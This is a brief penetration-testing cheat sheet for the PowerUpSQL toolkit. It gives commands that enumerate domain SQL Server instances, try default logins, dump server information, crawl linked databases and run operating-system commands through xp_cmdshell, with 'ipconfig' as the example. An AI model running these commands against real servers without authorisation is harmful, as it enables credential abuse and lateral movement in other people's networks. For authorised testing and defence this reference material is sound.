# PowerUpSQL

## Enumeration

```csharp
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
#local
Get-SQLInstanceLocal 

```

```text
Get-SQLInstanceLocal 
```

#### Default login

```csharp
 Get-SQLServerLoginDefaultPw -Verbose -Instance <SERVER>
```

## Dump

```csharp
Invoke-SQLDumpInfo -Verbose -Instance <SERVER>
```

## Database Link

```csharp
Get-SQLServerLink -Instance <SERVER>
Get-SQLServerLinkCrawl -Instance <SERVER> -Verbose | ft
```

## Command execution

```csharp
Get-SQLServerLinkCrawl -Instance <SERVER> -Query "exec master..xp_cmdshell 'ipconfig'"
```



